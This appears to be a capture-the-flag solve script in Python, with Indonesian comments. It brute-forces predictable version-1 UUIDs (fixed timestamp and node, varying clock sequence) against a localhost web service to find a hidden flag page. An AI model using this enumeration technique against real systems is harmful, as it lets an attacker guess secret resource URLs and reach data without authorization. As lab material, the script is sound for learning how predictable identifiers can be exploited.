import requests
from uuid import UUID

url = 'http://localhost:5003'

def gen_uuid(i):
	clock_seq = i
	timestamp = 139497851467149156  # waktu dalam 100-nanosecond sejak 15 Oktober 1582

	time_low = timestamp & 0xFFFFFFFF  # 32 bit terakhir
	time_mid = (timestamp >> 32) & 0xFFFF  # 16 bit berikutnya
	time_hi_version = ((timestamp >> 48) & 0x0FFF) | (1 << 12)  # 16 bit berikutnya dengan versi

	clock_seq_low = clock_seq & 0xFF
	clock_seq_hi_variant = (clock_seq >> 8) & 0x3F | 0x80  # Tambahkan bit varian

	node = 0x02420a000915

	uuid_reconstructed = UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node))
	return uuid_reconstructed

for i in range(256):
	path = gen_uuid(i)
	print(url+f'/{path}')
	print(f'index/{i}')
	respose = requests.get(url+f'/{path}')
	if 'FAKE' in respose.text:
		print(respose.text)
	elif '500' not in respose.text:
		print(respose.text)